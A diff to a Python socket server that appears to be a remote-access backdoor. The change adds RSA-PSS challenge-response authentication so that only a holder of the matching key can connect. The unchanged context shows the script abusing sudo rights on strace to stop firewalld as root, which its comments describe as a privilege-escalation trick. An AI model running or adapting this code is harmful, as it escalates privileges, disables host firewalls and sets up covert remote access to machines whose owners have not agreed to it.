@@ -1,7 +1,15 @@
 import socket
 import os
 import subprocess
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import padding
 
+PSS = padding.PSS(
+    mgf=padding.MGF1(hashes.SHA256()),
+    salt_length=padding.PSS.MAX_LENGTH,
+)
+with open("client_public.pem", "rb") as key_file:
+    public_key = serialization.load_pem_public_key(key_file.read())
 #disable firewall (cant connect w/o)
 #utilizes strace vuln to use systemctl as root
 os.system('sudo strace -o /dev/null /bin/sh -c "systemctl stop firewalld"')
@@ -32,7 +40,11 @@ while True:
 # Establish connection with client. 
   c, addr = s.accept()     
   print ('Got connection from', addr )
-  
+  request_to_sign = os.urandom(32)
+  c.sendall(request_to_sign)
+
+  signature = c.recv(1024)
+  public_key.verify(signature, request_to_sign, PSS, hashes.SHA256())
 
   c.send('Thank you for connecting'.encode()) 
   while True:
